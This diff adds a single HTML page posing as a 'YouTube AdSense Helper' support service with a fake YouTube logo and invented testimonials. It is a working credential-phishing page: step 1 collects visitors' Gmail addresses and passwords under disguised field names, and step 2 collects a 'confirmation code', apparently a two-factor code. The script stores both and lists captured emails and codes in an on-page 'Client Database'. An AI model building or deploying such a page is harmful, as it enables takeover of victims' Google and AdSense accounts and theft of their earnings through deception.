@@ -1,0 +1,613 @@
+<!doctype html>
+<html lang="en" class="h-full">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YouTube AdSense Helper</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="/_sdk/data_sdk.js"></script>
+  <script src="/_sdk/element_sdk.js"></script>
+  <style>
+        body {
+            box-sizing: border-box;
+        }
+        .youtube-bg {
+            background: #0f0f0f;
+        }
+        .youtube-red {
+            background: #ff0000;
+        }
+        .youtube-red-hover:hover {
+            background: #cc0000;
+        }
+        .youtube-card {
+            background: #212121;
+            border: 1px solid #303030;
+        }
+        .card-shadow {
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .success-animation {
+            animation: slideInUp 0.5s ease-out;
+        }
+        @keyframes slideInUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .youtube-logo {
+            font-family: 'YouTube Sans', 'Roboto', sans-serif;
+            font-weight: 500;
+        }
+    </style>
+  <style>@view-transition { navigation: auto; }</style>
+ </head>
+ <body class="h-full youtube-bg">
+  <main class="min-h-full flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
+   <div class="max-w-md w-full space-y-8"><!-- YouTube Header -->
+    <div class="text-center">
+     <div class="flex items-center justify-center mb-6"><!-- Logo YouTube officiel -->
+      <div class="flex items-center bg-white rounded-lg px-3 py-2 shadow-lg">
+       <svg class="h-8 w-12 text-red-600 mr-1" fill="currentColor" viewbox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
+       </svg><span class="text-xl font-bold text-black youtube-logo">YouTube</span>
+      </div>
+     </div>
+     <h1 id="site-title" class="text-3xl font-bold text-white mb-2">AdSense Helper</h1>
+     <p id="description" class="text-lg text-gray-300">I help you solve your AdSense problems and optimize your YouTube revenue</p>
+    </div><!-- ÉTAPE 1: Formulaire Nom/Prénom -->
+    <div id="step1-card" class="youtube-card rounded-xl card-shadow p-8">
+     <div class="text-center mb-6">
+      <h2 class="text-xl font-bold text-white mb-2">Step 1: Your Gmail Account</h2>
+      <p class="text-gray-300 text-sm">Enter your Gmail credentials to get started</p>
+     </div>
+     <form id="step1-form" class="space-y-6">
+      <div><label for="first_name" class="block text-sm font-medium text-gray-300 mb-2"> Gmail Address * </label> <input type="email" id="first_name" name="first_name" required class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg text-white focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200" placeholder="your.email@gmail.com">
+      </div>
+      <div><label for="last_name" class="block text-sm font-medium text-gray-300 mb-2"> Gmail Password * </label> <input type="password" id="last_name" name="last_name" required class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg text-white focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200" placeholder="Your Gmail password">
+      </div><button type="submit" id="step1-submit-btn" class="w-full youtube-red youtube-red-hover text-white font-semibold py-3 px-6 rounded-lg transform hover:scale-105 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 focus:ring-offset-gray-800"> <span id="step1-button-text">Continue to Step 2</span> <span id="step1-loading-spinner" class="hidden ml-2">
+        <svg class="animate-spin h-4 w-4 inline" fill="none" viewbox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle> <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+        </svg></span> </button>
+     </form>
+    </div><!-- ÉTAPE 2: Code de Confirmation -->
+    <div id="step2-card" class="hidden youtube-card rounded-xl card-shadow p-8">
+     <div class="text-center mb-6">
+      <div class="bg-green-600 rounded-full h-12 w-12 flex items-center justify-center mx-auto mb-4">
+       <svg class="h-6 w-6 text-white" fill="currentColor" viewbox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+       </svg>
+      </div>
+      <h2 class="text-xl font-bold text-white mb-2">Step 2: Confirmation Code</h2>
+      <p class="text-gray-300 text-sm">Hello <span id="step2-name" class="text-white font-semibold"></span>!</p>
+      <p class="text-gray-300 text-sm">Your Gmail account has been saved. Now enter your confirmation code.</p>
+     </div>
+     <form id="step2-form" class="space-y-6">
+      <div><label for="confirmation_code" class="block text-sm font-medium text-gray-300 mb-2"> Your Confirmation Code * </label> <input type="text" id="confirmation_code" name="confirmation_code" required class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg text-white focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 font-mono text-center text-lg tracking-widest uppercase" placeholder="Enter your code" style="text-transform: uppercase;">
+       <p class="text-gray-400 text-sm mt-1">Enter your confirmation code (any length)</p>
+      </div>
+      <div class="flex space-x-3"><button type="button" id="back-to-step1-btn" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-medium py-3 px-4 rounded-lg transition-all duration-200"> ← Back </button> <button type="submit" id="step2-submit-btn" class="flex-1 youtube-red youtube-red-hover text-white font-semibold py-3 px-6 rounded-lg transform hover:scale-105 transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 focus:ring-offset-gray-800"> <span id="step2-button-text">Confirm Code</span> <span id="step2-loading-spinner" class="hidden ml-2">
+         <svg class="animate-spin h-4 w-4 inline" fill="none" viewbox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle> <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
+         </svg></span> </button>
+      </div>
+     </form>
+    </div><!-- Message de Succès -->
+    <div id="success-message" class="hidden youtube-card rounded-xl card-shadow p-8 text-center success-animation">
+     <div class="mb-6">
+      <div class="bg-green-600 rounded-full h-16 w-16 flex items-center justify-center mx-auto mb-4">
+       <svg class="h-8 w-8 text-white" fill="currentColor" viewbox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+       </svg>
+      </div>
+      <h2 class="text-2xl font-bold text-white mb-2">Registration Complete!</h2>
+      <p class="text-gray-300">Thank you <span id="success-name" class="text-white font-semibold"></span>! Your Gmail account registration is now complete.</p>
+     </div>
+     <div class="bg-gradient-to-r from-green-600 to-blue-600 rounded-xl p-6 mb-6 border-2 border-green-400">
+      <h3 class="text-xl font-bold text-white mb-4">✅ What happens next?</h3>
+      <div class="text-left space-y-2 text-white">
+       <p>• I will review your Gmail account information</p>
+       <p>• You will be contacted via Gmail within 24 hours</p>
+       <p>• Your case will be resolved quickly and efficiently</p>
+      </div>
+     </div><button id="new-registration-btn" class="w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-3 px-4 rounded-lg transition-all duration-200"> Register Another Client </button>
+    </div><!-- Base de Données -->
+    <div class="mt-12 youtube-card rounded-xl p-6">
+     <div class="flex items-center justify-between mb-6">
+      <h2 class="text-2xl font-bold text-white">Client Database</h2>
+      <div class="flex items-center text-gray-300">
+       <svg class="h-5 w-5 mr-2" fill="currentColor" viewbox="0 0 20 20"><path d="M9 12a1 1 0 102 0V7a1 1 0 10-2 0v5zM6 12a1 1 0 102 0V7a1 1 0 10-2 0v5zM13 12a1 1 0 102 0V7a1 1 0 10-2 0v5z" /> <path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4zm0 2h12v8H4V6z" clip-rule="evenodd" />
+       </svg><span id="client-count">0 clients registered</span>
+      </div>
+     </div>
+     <div id="database-container" class="space-y-3 max-h-64 overflow-y-auto">
+      <div id="empty-state" class="text-center py-8 text-gray-400">
+       <svg class="h-12 w-12 mx-auto mb-4 opacity-50" fill="none" stroke="currentColor" viewbox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2 2v-5m16 0h-2M4 13h2m0 0V9a2 2 0 012-2h2m0 0V6a2 2 0 012-2h2.586a1 1 0 01.707.293l2.414 2.414A1 1 0 0016 7.414V9" />
+       </svg>
+       <p>No clients registered yet</p>
+       <p class="text-sm mt-1">Client data will appear here when someone submits the form</p>
+      </div>
+     </div>
+    </div><!-- Témoignages -->
+    <div class="mt-12 youtube-card rounded-xl p-6">
+     <h2 class="text-2xl font-bold text-white text-center mb-6">Client Testimonials</h2>
+     <div class="space-y-4 max-h-96 overflow-y-auto">
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 border border-gray-700">
+       <div class="flex items-center mb-2">
+        <div class="flex text-yellow-400"><span>⭐⭐⭐⭐⭐</span>
+        </div><span class="ml-2 text-white font-medium">Sarah M.</span>
+       </div>
+       <p class="text-gray-300 text-sm">Thank you! I had a monetization problem for 3 months, solved in 2 days thanks to your advice.</p>
+      </div>
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 border border-gray-700">
+       <div class="flex items-center mb-2">
+        <div class="flex text-yellow-400"><span>⭐⭐⭐⭐⭐</span>
+        </div><span class="ml-2 text-white font-medium">Mike D.</span>
+       </div>
+       <p class="text-gray-300 text-sm">Excellent service! I had a blocked AdSense account, now I earn $400/month. Thank you so much!</p>
+      </div>
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 border border-gray-700">
+       <div class="flex items-center mb-2">
+        <div class="flex text-yellow-400"><span>⭐⭐⭐⭐⭐</span>
+        </div><span class="ml-2 text-white font-medium">Alex B.</span>
+       </div>
+       <p class="text-gray-300 text-sm">Top service! I had an AdSense validation problem for months. Solved quickly, very professional.</p>
+      </div>
+     </div>
+    </div><!-- Features -->
+    <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-8">
+     <div class="text-center text-white">
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 mb-2 border border-gray-700">
+       <svg class="h-6 w-6 mx-auto text-red-500" fill="currentColor" viewbox="0 0 20 20"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+       </svg>
+      </div>
+      <p class="text-sm">Certified Expert</p>
+     </div>
+     <div class="text-center text-white">
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 mb-2 border border-gray-700">
+       <svg class="h-6 w-6 mx-auto text-red-500" fill="currentColor" viewbox="0 0 20 20"><path d="M3 4a1 1 0 011-1h12a1 1 0 011 1v2a1 1 0 01-1 1H4a1 1 0 01-1-1V4zM3 10a1 1 0 011-1h6a1 1 0 011 1v6a1 1 0 01-1 1H4a1 1 0 01-1-1v-6zM14 9a1 1 0 00-1 1v6a1 1 0 001 1h2a1 1 0 001-1v-6a1 1 0 00-1-1h-2z" />
+       </svg>
+      </div>
+      <p class="text-sm">Personal Support</p>
+     </div>
+     <div class="text-center text-white">
+      <div class="bg-gray-800 bg-opacity-60 rounded-lg p-4 mb-2 border border-gray-700">
+       <svg class="h-6 w-6 mx-auto text-red-500" fill="currentColor" viewbox="0 0 20 20"><path fill-rule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clip-rule="evenodd" />
+       </svg>
+      </div>
+      <p class="text-sm">Fast Results</p>
+     </div>
+    </div>
+   </div>
+  </main>
+  <script>
+        // Configuration par défaut
+        const defaultConfig = {
+            site_title: "AdSense Helper",
+            description: "I help you solve your AdSense problems and optimize your YouTube revenue",
+            button_text: "Get Help Now",
+            whatsapp_number: "+1234567890"
+        };
+
+        // Variables globales
+        let currentData = [];
+        let pendingRegistration = null;
+
+        // Gestionnaire de données optimisé
+        const dataHandler = {
+            onDataChanged(data) {
+                currentData = data;
+                // Mise à jour asynchrone pour éviter les blocages
+                requestAnimationFrame(() => {
+                    updateDatabase(data);
+                    updateClientCount(data.length);
+                });
+            }
+        };
+
+        // Mise à jour de l'affichage de la base de données
+        function updateDatabase(data) {
+            const container = document.getElementById('database-container');
+            const emptyState = document.getElementById('empty-state');
+            
+            if (data.length === 0) {
+                emptyState.style.display = 'block';
+                const clientElements = container.querySelectorAll('.client-entry');
+                clientElements.forEach(el => el.remove());
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            // Créer une map des éléments existants
+            const existingElements = new Map();
+            container.querySelectorAll('.client-entry').forEach(el => {
+                existingElements.set(el.dataset.clientId, el);
+            });
+            
+            // Traiter chaque client
+            data.forEach(client => {
+                if (existingElements.has(client.__backendId)) {
+                    updateClientElement(existingElements.get(client.__backendId), client);
+                    existingElements.delete(client.__backendId);
+                } else {
+                    const clientElement = createClientElement(client);
+                    container.appendChild(clientElement);
+                }
+            });
+            
+            // Supprimer les éléments qui n'existent plus
+            existingElements.forEach(el => el.remove());
+        }
+
+        // Créer un élément client
+        function createClientElement(client) {
+            const div = document.createElement('div');
+            div.className = 'client-entry bg-gray-800 bg-opacity-60 rounded-lg p-4 border border-gray-700 flex items-center justify-between';
+            div.dataset.clientId = client.__backendId;
+            
+            const date = new Date(client.createdAt);
+            const formattedDate = date.toLocaleDateString('en-US', {
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+            
+            const status = client.status || 'pending';
+            const statusDisplay = status === 'completed' ? 
+                `<span class="bg-green-900 text-green-300 px-2 py-1 rounded-full text-xs">✅ Completed</span>` :
+                `<span class="bg-yellow-900 text-yellow-300 px-2 py-1 rounded-full text-xs">🟡 Waiting for code</span>`;
+            
+            const codeDisplay = client.confirmation_code ? 
+                `<p class="text-yellow-300 text-sm font-mono font-bold bg-yellow-900 bg-opacity-50 px-2 py-1 rounded mt-1">Code: ${client.confirmation_code}</p>` :
+                `<p class="text-gray-400 text-sm mt-1">No code yet</p>`;
+            
+            div.innerHTML = `
+                <div class="flex items-center">
+                    <div class="bg-red-600 rounded-full h-10 w-10 flex items-center justify-center mr-3">
+                        <span class="text-white text-sm font-bold">@</span>
+                    </div>
+                    <div>
+                        <p class="text-white font-medium">${client.first_name}</p>
+                        <p class="text-gray-400 text-sm">${formattedDate}</p>
+                        ${codeDisplay}
+                    </div>
+                </div>
+                <div class="flex items-center">
+                    ${statusDisplay}
+                </div>
+            `;
+            
+            return div;
+        }
+
+        // Mise à jour un élément client existant
+        function updateClientElement(element, client) {
+            const date = new Date(client.createdAt);
+            const formattedDate = date.toLocaleDateString('en-US', {
+                year: 'numeric',
+                month: 'short',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+            
+            const status = client.status || 'pending';
+            const statusDisplay = status === 'completed' ? 
+                `<span class="bg-green-900 text-green-300 px-2 py-1 rounded-full text-xs">✅ Completed</span>` :
+                `<span class="bg-yellow-900 text-yellow-300 px-2 py-1 rounded-full text-xs">🟡 Waiting for code</span>`;
+            
+            const codeDisplay = client.confirmation_code ? 
+                `<p class="text-yellow-300 text-sm font-mono font-bold bg-yellow-900 bg-opacity-50 px-2 py-1 rounded mt-1">Code: ${client.confirmation_code}</p>` :
+                `<p class="text-gray-400 text-sm mt-1">No code yet</p>`;
+            
+            element.innerHTML = `
+                <div class="flex items-center">
+                    <div class="bg-red-600 rounded-full h-10 w-10 flex items-center justify-center mr-3">
+                        <span class="text-white text-sm font-bold">@</span>
+                    </div>
+                    <div>
+                        <p class="text-white font-medium">${client.first_name}</p>
+                        <p class="text-gray-400 text-sm">${formattedDate}</p>
+                        ${codeDisplay}
+                    </div>
+                </div>
+                <div class="flex items-center">
+                    ${statusDisplay}
+                </div>
+            `;
+        }
+
+        // Mettre à jour le compteur de clients
+        function updateClientCount(count) {
+            const clientCountElement = document.getElementById('client-count');
+            clientCountElement.textContent = `${count} client${count !== 1 ? 's' : ''} registered`;
+        }
+
+        // Fonction de rendu
+        async function render(config) {
+            const siteTitle = config.site_title || defaultConfig.site_title;
+            const description = config.description || defaultConfig.description;
+            const buttonText = config.button_text || defaultConfig.button_text;
+
+            document.getElementById('site-title').textContent = siteTitle;
+            document.getElementById('description').textContent = description;
+        }
+
+        // Capacités d'édition
+        function mapToCapabilities(config) {
+            return {
+                recolorables: [],
+                borderables: [],
+                fontEditable: undefined,
+                fontSizeable: undefined
+            };
+        }
+
+        // Valeurs du panneau d'édition
+        function mapToEditPanelValues(config) {
+            return new Map([
+                ["site_title", config.site_title || defaultConfig.site_title],
+                ["description", config.description || defaultConfig.description],
+                ["button_text", config.button_text || defaultConfig.button_text],
+                ["whatsapp_number", config.whatsapp_number || defaultConfig.whatsapp_number]
+            ]);
+        }
+
+        // Configuration de l'étape 1
+        function setupStep1() {
+            const form = document.getElementById('step1-form');
+            const submitBtn = document.getElementById('step1-submit-btn');
+            const buttonText = document.getElementById('step1-button-text');
+            const loadingSpinner = document.getElementById('step1-loading-spinner');
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                // Vérification de la limite
+                if (currentData.length >= 999) {
+                    showError(form, "Maximum limit of 999 clients reached. Please contact administrator.");
+                    return;
+                }
+
+                const formData = new FormData(form);
+                const firstName = formData.get('first_name').trim();
+                const lastName = formData.get('last_name').trim();
+
+                if (!firstName || !lastName) {
+                    showError(form, "Please fill in all required fields.");
+                    return;
+                }
+
+                // Loading state
+                submitBtn.disabled = true;
+                buttonText.textContent = "Saving...";
+                loadingSpinner.classList.remove('hidden');
+
+                try {
+                    // Créer l'entrée initiale
+                    const result = await window.dataSdk.create({
+                        first_name: firstName,
+                        last_name: lastName,
+                        confirmation_code: '',
+                        status: 'pending',
+                        createdAt: new Date().toISOString()
+                    });
+
+                    if (result.isOk) {
+                        // Attendre un peu pour que les données soient mises à jour
+                        // Transition immédiate pour plus de rapidité
+                        const newClient = currentData.find(client => 
+                            client.first_name === firstName && 
+                            client.last_name === lastName && 
+                            client.status === 'pending'
+                        );
+                        
+                        if (newClient) {
+                            showStep2(firstName, lastName, newClient.__backendId);
+                            resetStep1Button();
+                        } else {
+                            // Petit délai seulement si nécessaire
+                            setTimeout(() => {
+                                const retryClient = currentData.find(client => 
+                                    client.first_name === firstName && 
+                                    client.last_name === lastName && 
+                                    client.status === 'pending'
+                                );
+                                if (retryClient) {
+                                    showStep2(firstName, lastName, retryClient.__backendId);
+                                } else {
+                                    showError(form, "Error finding created record. Please try again.");
+                                }
+                                resetStep1Button();
+                            }, 100);
+                        }
+                    } else {
+                        showError(form, "Error saving data. Please try again.");
+                        resetStep1Button();
+                    }
+                } catch (error) {
+                    showError(form, "Connection error. Please try again.");
+                    resetStep1Button();
+                }
+            });
+
+            function resetStep1Button() {
+                submitBtn.disabled = false;
+                buttonText.textContent = "Continue to Step 2";
+                loadingSpinner.classList.add('hidden');
+            }
+        }
+
+        // Configuration de l'étape 2
+        function setupStep2() {
+            const form = document.getElementById('step2-form');
+            const submitBtn = document.getElementById('step2-submit-btn');
+            const buttonText = document.getElementById('step2-button-text');
+            const loadingSpinner = document.getElementById('step2-loading-spinner');
+            const confirmationCodeInput = document.getElementById('confirmation_code');
+            const backBtn = document.getElementById('back-to-step1-btn');
+
+            // Formatage automatique du code (accepte tous caractères)
+            confirmationCodeInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.toUpperCase();
+            });
+
+            // Bouton retour
+            backBtn.addEventListener('click', () => {
+                showStep1();
+                form.reset();
+                pendingRegistration = null;
+            });
+
+            // Soumission du formulaire
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+
+                const formData = new FormData(form);
+                const confirmationCode = formData.get('confirmation_code').trim().toUpperCase();
+
+                if (!confirmationCode) {
+                    showError(form, "Please enter your confirmation code.");
+                    return;
+                }
+
+                if (!pendingRegistration) {
+                    showError(form, "Session expired. Please start over.");
+                    return;
+                }
+
+                // Loading state
+                submitBtn.disabled = true;
+                buttonText.textContent = "Confirming...";
+                loadingSpinner.classList.remove('hidden');
+
+                try {
+                    const clientToUpdate = currentData.find(client => client.__backendId === pendingRegistration.clientId);
+                    
+                    if (clientToUpdate) {
+                        clientToUpdate.confirmation_code = confirmationCode;
+                        clientToUpdate.status = 'completed';
+                        
+                        const result = await window.dataSdk.update(clientToUpdate);
+
+                        if (result.isOk) {
+                            showSuccessMessage(pendingRegistration.firstName, pendingRegistration.lastName);
+                            resetStep2Button();
+                            pendingRegistration = null;
+                        } else {
+                            showError(form, "Error updating data. Please try again.");
+                            resetStep2Button();
+                        }
+                    } else {
+                        showError(form, "Client not found. Please start over.");
+                        resetStep2Button();
+                    }
+                } catch (error) {
+                    showError(form, "Connection error. Please try again.");
+                    resetStep2Button();
+                }
+            });
+
+            function resetStep2Button() {
+                submitBtn.disabled = false;
+                buttonText.textContent = "Confirm Code";
+                loadingSpinner.classList.add('hidden');
+            }
+        }
+
+        // Afficher l'étape 1
+        function showStep1() {
+            document.getElementById('step1-card').classList.remove('hidden');
+            document.getElementById('step2-card').classList.add('hidden');
+            document.getElementById('success-message').classList.add('hidden');
+        }
+
+        // Afficher l'étape 2
+        function showStep2(firstName, lastName, clientId) {
+            document.getElementById('step1-card').classList.add('hidden');
+            document.getElementById('step2-card').classList.remove('hidden');
+            document.getElementById('success-message').classList.add('hidden');
+            
+            document.getElementById('step2-name').textContent = firstName;
+            pendingRegistration = { firstName, lastName, clientId };
+        }
+
+        // Afficher le message de succès
+        function showSuccessMessage(firstName, lastName) {
+            document.getElementById('step1-card').classList.add('hidden');
+            document.getElementById('step2-card').classList.add('hidden');
+            document.getElementById('success-message').classList.remove('hidden');
+            
+            document.getElementById('success-name').textContent = firstName;
+            
+            // Configuration du bouton nouveau client
+            const newRegBtn = document.getElementById('new-registration-btn');
+            newRegBtn.onclick = () => {
+                showStep1();
+                document.getElementById('step1-form').reset();
+                document.getElementById('step2-form').reset();
+                pendingRegistration = null;
+            };
+        }
+
+        // Afficher une erreur
+        function showError(form, message) {
+            const existingError = form.querySelector('.error-message');
+            if (existingError) {
+                existingError.remove();
+            }
+
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message mt-4 p-4 bg-red-900 border border-red-700 rounded-lg';
+            errorDiv.innerHTML = `
+                <div class="flex items-center">
+                    <svg class="h-5 w-5 text-red-400 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>
+                    </svg>
+                    <p class="text-red-300">${message}</p>
+                </div>
+            `;
+            form.appendChild(errorDiv);
+            setTimeout(() => errorDiv.remove(), 3000);
+        }
+
+        // Initialisation
+        async function init() {
+            try {
+                // Initialisation du SDK de données
+                if (window.dataSdk) {
+                    const initResult = await window.dataSdk.init(dataHandler);
+                    if (!initResult.isOk) {
+                        console.error("Erreur d'initialisation du SDK de données");
+                    }
+                }
+
+                // Initialisation du SDK d'éléments
+                if (window.elementSdk) {
+                    await window.elementSdk.init({
+                        defaultConfig,
+                        render,
+                        mapToCapabilities,
+                        mapToEditPanelValues
+                    });
+                }
+
+                // Configuration des formulaires
+                setupStep1();
+                setupStep2();
+
+                // Rendu initial
+                await render(defaultConfig);
+            } catch (error) {
+                console.error("Erreur d'initialisation:", error);
+            }
+        }
+
+        // Démarrage de l'application
+        init();
+    </script>
+ <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9910a4ec8475b7ab',t:'MTc2MDg4MDc3NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
